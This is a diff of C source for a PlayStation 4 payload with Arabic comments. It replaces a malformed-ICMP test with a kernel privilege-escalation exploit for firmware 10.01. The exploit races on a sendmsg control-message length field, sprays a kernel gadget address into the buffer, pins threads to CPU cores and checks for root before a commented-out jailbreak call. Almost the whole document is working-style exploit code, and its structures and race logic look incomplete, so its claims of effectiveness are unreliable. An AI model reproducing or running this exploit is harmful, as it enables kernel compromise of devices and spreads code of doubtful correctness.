@@ -1,93 +1,120 @@
-#include "ps4.h"
+#include <ps4.h>
+//#include "payload_utils.h" // ضروري لاستخدام get_kernel_base()
 
-#define SOCK_RAW        3
+// تعريف الهياكل الضرورية
+struct msghdr {
+    void         *msg_name;
+    uint32_t      msg_namelen;
+    void         *msg_iov;
+    int           msg_iovlen;
+    void         *msg_control;
+    uint32_t      msg_controllen;
+    int           msg_flags;
+};
 
-#define debug(sock, format, ...)                    \
-    do {                                            \
-        char buffer[512];                           \
-        int size = sprintf(buffer, format, ##__VA_ARGS__); \
-        sceNetSend(sock, buffer, size, 0);          \
-    } while(0)
+struct cmsghdr {
+    uint32_t      cmsg_len;
+    int           cmsg_level;
+    int           cmsg_type;
+};
 
-int _main(void) {
+// الإزاحات الخاصة بـ 10.01 التي وجدتها
+#define JMP_RSI_GADGET_OFFSET 0x68B1
+#define IP_RETOPTS 7
+#define ITERATIONS 500000 // زيادة المحاولات للسباق
+#define CONTROL_LEN 256
 
+struct cmsghdr *cmsg;
+uint8_t control_buf[CONTROL_LEN];
+int global_sock;
+int running = 1;
+
+// خيط إرسال الرسالة (Trigger)
+void *sendmsg_thread(void *arg) {
+    struct msghdr msg;
+    memset(&msg, 0, sizeof(msg));
+    msg.msg_control = control_buf;
+    msg.msg_controllen = CONTROL_LEN;
+
+    while(running) {
+        // Syscall 28 هو sendmsg
+        syscall(28, global_sock, &msg, 0);
+    }
+    return NULL;
+}
+
+// خيط السباق (The Racer)
+void *race_thread(void *arg) {
+    while(running) {
+        cmsg->cmsg_len = 0x50;   // القيمة الصحيحة للفحص
+        cmsg->cmsg_len = 0xFFFF; // القيمة الفائضة للفيضان
+    }
+    return NULL;
+}
+
+// دالة بناء البايلود باستخدام Offsets 10.01
+void build_payload(uint64_t kbase) {
+    memset(control_buf, 0, CONTROL_LEN);
+    cmsg = (struct cmsghdr *)control_buf;
+    cmsg->cmsg_level = 0; 
+    cmsg->cmsg_type = IP_RETOPTS;
+    cmsg->cmsg_len = 0x50;
+
+    // وضع الـ Gadget في مكان ext_free المتوقع عند حدوث الفيضان
+    // نضع العنوان في أماكن متعددة لزيادة احتمالية الإصابة (Spraying)
+    uint64_t target_gadget = kbase + JMP_RSI_GADGET_OFFSET;
+    for (int i = 0x60; i < CONTROL_LEN - 8; i += 8) {
+        *(uint64_t *)(control_buf + i) = target_gadget;
+    }
+}
+
+int _main(struct thread *td) {
+    // 1. تهيئة المكتبات من الـ SDK
     initKernel();
     initLibc();
     initNetwork();
 
-    char socketName[] = "debug";
+    // 2. جلب Kernel Base تلقائياً (من ملف payload_utils.h)
+    uint64_t kbase = get_kernel_base();
+    if (kbase == 0) return -1;
 
-    struct sockaddr_in server;
-    server.sin_len = sizeof(server);
-    server.sin_family = AF_INET;
-    server.sin_addr.s_addr = IP(192, 168, 248, 159);
-    server.sin_port = sceNetHtons(9023);
-    memset(server.sin_zero, 0, sizeof(server.sin_zero));
+    // 3. تجهيز المقبس والبايلود
+    global_sock = syscall(97, 2, 2, 0); // socket(AF_INET, SOCK_DGRAM, 0)
+    build_payload(kbase);
 
-    int debug_sock = sceNetSocket(socketName, AF_INET, SOCK_STREAM, 0);
-    if (debug_sock < 0) {
-        return 0;
+    // 4. إعداد الأنوية (Affinity) لضمان سرعة السباق
+    ScePthread thread1, thread2;
+    cpuset_t cpu6, cpu7;
+    CPU_ZERO(&cpu6); CPU_ZERO(&cpu7);
+    CPU_SET(6, &cpu6); CPU_SET(7, &cpu7);
+
+    // 5. إطلاق الخيوط
+    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
+    scePthreadSetaffinityNp(thread1, sizeof(cpu6), &cpu6);
+
+    scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");
+    scePthreadSetaffinityNp(thread2, sizeof(cpu7), &cpu7);
+
+    // 6. المراقبة: هل نجحنا في أن نصبح Root؟
+    while(running) {
+        if (getuid() == 0) {
+            running = 0; // إيقاف السباق
+            
+            // إرسال إشعار بالنجاح
+            SceNotificationRequest notify;
+            notify.type = 0;
+            snprintf(notify.message, sizeof(notify.message), "Root Success! FW 10.01");
+            sceKernelSendNotificationRequest(0, &notify, sizeof(notify), 0);
+            
+            // هنا يمكنك استدعاء الـ Jailbreak الفعلي من الـ SDK
+            //jailbreak(); 
+            break;
+        }
+        sceKernelUsleep(500000); // تفقد كل نصف ثانية
     }
 
-    if (sceNetConnect(debug_sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
-        sceNetSocketClose(debug_sock);
-        return 0;
-    }
-
-    debug(debug_sock, "PID: %d\n", syscall(20));
-
-    int raw_sock = sceNetSocket("raw_icmp", AF_INET, SOCK_RAW, SCE_NET_IPPROTO_ICMP);
-
-    if (raw_sock < 0) {
-        debug(debug_sock, "Raw ICMP socket failed: %d (errno: %d)\n", raw_sock, sce_net_errno);
-        goto cleanup;
-    }
-
-    debug(debug_sock, "Raw ICMP socket created: %d\n", raw_sock);
-
-    struct sockaddr_in dest;
-    memset(&dest, 0, sizeof(dest));
-    dest.sin_len = sizeof(dest);
-    dest.sin_family = AF_INET;
-    dest.sin_port = 0;
-    dest.sin_addr.s_addr = IP(192, 168, 248, 159);
-
-    uint8_t icmp_packet[96];
-    memset(icmp_packet, 0, sizeof(icmp_packet));
-
-    icmp_packet[0] = 3;
-    icmp_packet[1] = 99;
-
-    uint8_t *quoted = icmp_packet + 8;
-    quoted[0] = 0x45;
-    quoted[1] = 0x00;
-    quoted[2] = 0x00; quoted[3] = 0x28;
-    quoted[4] = 0x00; quoted[5] = 0x00;
-    quoted[6] = 0x40; quoted[7] = 0x00;
-    quoted[8] = 64;
-    quoted[9] = 6;
-
-    quoted[12] = 192; quoted[13] = 168; quoted[14] = 0; quoted[15] = 100;
-    quoted[16] = 192; quoted[17] = 168; quoted[18] = 0; quoted[19] = 1;
-
-    memset(quoted + 20, 0xAA, 32);
-
-    int packet_len = 8 + 20 + 32;
-
-    sceNetConnect(raw_sock, (struct sockaddr *)&dest, sizeof(dest));
-
-    int sent = sceNetSend(raw_sock, icmp_packet, packet_len, 0);
-
-    if (sent < 0) {
-        debug(debug_sock, "sceNetSend failed: %d (errno: %d)\n", sent, sce_net_errno);
-    } else {
-        debug(debug_sock, "Sent malformed ICMPv4: %d bytes\n", sent);
-    }
-
-    sceNetSocketClose(raw_sock);
-
-cleanup:
-    sceNetSocketClose(debug_sock);
+    scePthreadJoin(thread1, NULL);
+    scePthreadJoin(thread2, NULL);
 
     return 0;
 }
